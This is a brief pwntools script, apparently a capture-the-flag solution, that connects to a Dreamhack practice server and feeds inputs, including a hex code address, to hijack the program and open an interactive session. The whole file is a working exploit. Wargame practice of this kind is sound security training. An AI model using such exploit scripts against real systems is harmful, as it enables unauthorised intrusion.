from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22449
r = remote(HOST, PORT)

r.sendlineafter(b'name: ', b'A')
r.sendlineafter(b'hex value: ', b'0x40125b')
r.sendlineafter(b'integer count:', b'8')
r.interactive()